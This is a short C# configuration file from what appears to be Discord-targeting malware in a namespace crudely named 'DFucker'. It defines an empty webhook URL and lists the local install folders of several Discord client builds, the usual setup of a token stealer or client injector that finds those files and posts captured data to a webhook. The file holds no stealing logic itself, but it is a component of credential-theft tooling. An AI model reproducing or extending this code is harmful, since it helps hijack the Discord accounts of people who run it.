using System;
using System.Collections.Generic;

namespace DFucker
{
	internal class Config
	{

		public static string webhookURL = "";

		public static Dictionary<string, string> builds = new Dictionary<string, string>{
			{"Discord", Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\discord"},
			{"DiscordStable", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\Discord"},
			{"DiscordPTB", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordPTB"},
			{"DiscordCanary", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordCanary"},
			{"DiscordDevelopement", Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + "\\DiscordDevelopement"}
		};


	}
}